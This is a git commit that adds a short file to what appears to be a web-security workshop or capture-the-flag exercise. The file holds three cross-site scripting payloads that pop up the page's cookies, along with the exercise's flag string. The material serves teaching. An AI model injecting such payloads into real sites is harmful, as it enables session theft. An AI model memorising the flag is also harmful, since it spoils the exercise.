39a395644083e861fa31edf769276aeb7a22e96b
Izabel Chaves <145824500+rainbowcrack@users.noreply.github.com>
2025-03-29 15:17:12 -0300

    Create sala02.js

---
+++ Workshop-Vai-na-WEB-Summit-2025/sala02.js
@@ -0,0 +1,6 @@
+// alert(document.cookie); no Console DevTools
+<img src="x" onerror="alert(document.cookie)">
+<iframe src="x" onerror="alert(document.cookie)"></iframe>
+<input onfocus="alert(document.cookie)" value="Clique aqui">
+  
+  // FLAG: FLAG{XSS_ATTACK_77}
